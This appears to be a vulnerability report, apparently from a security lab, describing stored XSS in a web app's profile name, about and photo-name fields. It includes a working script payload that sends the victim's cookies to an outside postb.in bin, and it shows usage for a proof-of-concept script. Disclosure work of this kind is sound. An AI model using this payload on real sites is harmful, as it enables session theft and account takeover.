# Vulnerability 9: XSS in profile page (name, about, photo) - content of the name, about, and photo name can contain script which will be executed on any person viewing profile

- Vulnerability: XSS
- Where: `name` in profile
- Where: `about` in profile
- Where: `photo` in profile
- Impact: Allows to run any script on person viewing the malicious profile


## Description
* When a person opens the main page the profile with the name is loaded so if the field `name` or `photo name` contains a script
    it will be executed in case the profile appears on the main screen (that happens when it has `Public` posts).
* When the victim opens `pending requests` all the fields related to the malicious user including `about`, `name`, and `photo` are loaded 
    so if there is a script present in them it will be executed


## Steps to reproduce

1. Create a post containing malicious script like the one below.
    * If the attack is targeted to friend requests - put the script in the `about` section.
    * If the attach is for everyone - put the script in the `name` section or upload a `photo` with the name having the script. 
    * Also create a random post with `Public` visibility.
    ```html
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://cors-anywhere.herokuapp.com/https://postb.in/1603555839181-2461015884764", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
        xhr.send(JSON.stringify({
            "cookie": document.cookie
        }));
    </script>
    ```
2. If the attack is through the `about` section - send a friend request to the victim. 
3. When any victim opens the main page the script will be loaded as part of the `name`
    and will be executed. So if the script is sending data to 
    [https://postb.in](https://postb.in/1603555839181-2461015884764)
    or another server we can view the sent data there.
4. When the victim opens the pending friend requests the script from both `about`, `name`, and `photo name` sections can be executed.


## Script usage
The script creates `postb.in` bin and sends cookies from the victim's side to the bin.
Can have both targeted (with a friend request) or attach on everyone who opens public section of posts.

```shell script
python vuln9.py <server> <target_url> <victim_username> <victim_password> <hacker_username> <hacker_password> --field {nameInput/aboutInput}
# Example:
python vuln9.py -h  # for more details
``` 


[(POC)](vuln9.py)
